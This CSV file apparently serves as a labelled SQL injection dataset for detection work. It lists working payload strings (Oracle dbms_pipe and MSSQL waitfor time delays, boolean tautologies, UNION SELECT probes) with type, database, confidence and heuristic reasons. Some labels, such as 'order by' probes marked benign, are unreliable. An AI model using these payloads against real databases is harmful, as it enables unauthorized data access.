id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
20752,"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20829,"1"" ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ""diiv"" = ""diiv",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20941,"1%"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20943,"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
20775,waitfor delay '0:0:5'# ogzq,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20776,"1"" ) where 6821 = 6821 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20799,1' ) waitfor delay '0:0:5' and ( 'peyv' like 'peyv,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20810,1 ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 18 chars.,2
20816,-6015%' ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
20840,1%' ) ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
20866,"1%"" ) waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
20869,-8264%' ) order by 1#,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 21 chars.,2
20887,"1,iif ( 7475 = 7475,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 27 chars.,2
20897,"1' ) where 1225 = 1225 and elt ( 8831 = 7779,7779 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
20902,"1'|| ( select 'pygt' from dual where 5543 = 5543 union all select null,null,null,null,null,null#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
20927,"1 ) where 2720 = 2720 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
20749,1 ) ) as rcbz where 4563 = 4563 and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 47 chars.,2
20758,-1470' ) ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 28 chars.,2
20759,"1' ) ) as mjps where 2179 = 2179 union all select null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 86 chars.,2
20760,"1"" ) ) union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
20766,-2823' ) ) or 5663 = 4228 and ( ( 'skgh' like 'skgh,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
20772,"1%"" ) ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
20774,"-9265"" ) or 7834 = 1685",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
20777,"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
20779,"-5131' ) ) ) union all select 4854,4854,4854,4854,4854,4854,4854#",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
20788,-2316' ) ) ) or 8519 = 6010,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
20791,1 where 7516 = 7516 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 42 chars.,2
20792,"-3638"" union all select 4394,4394,4394,4394,4394,4394,4394--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
20794,"-7485%' ) ) ) union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
20805,"-1079"" ) where 2865 = 2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20808,"-1894' ) union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",union_based,generic,0.7,UNION-based payload detected. Payload length: 71 chars.,2
20809,1%' ) ) ) union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 33 chars.,2
20814,"-9451"" ) ) ) union all select 4211,4211,4211,4211,4211,4211,4211--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
20819,"1"" where 1852 = 1852 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 83 chars.,2
20832,"1 ) ) as hpxw where 1826 = 1826 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 89 chars.,2
20833,"1%"" ) ) ) union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
20837,-3666' ) where 6386 = 6386 union all select 6386--,union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
20843,"-5959"" or 2477 = 1144",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
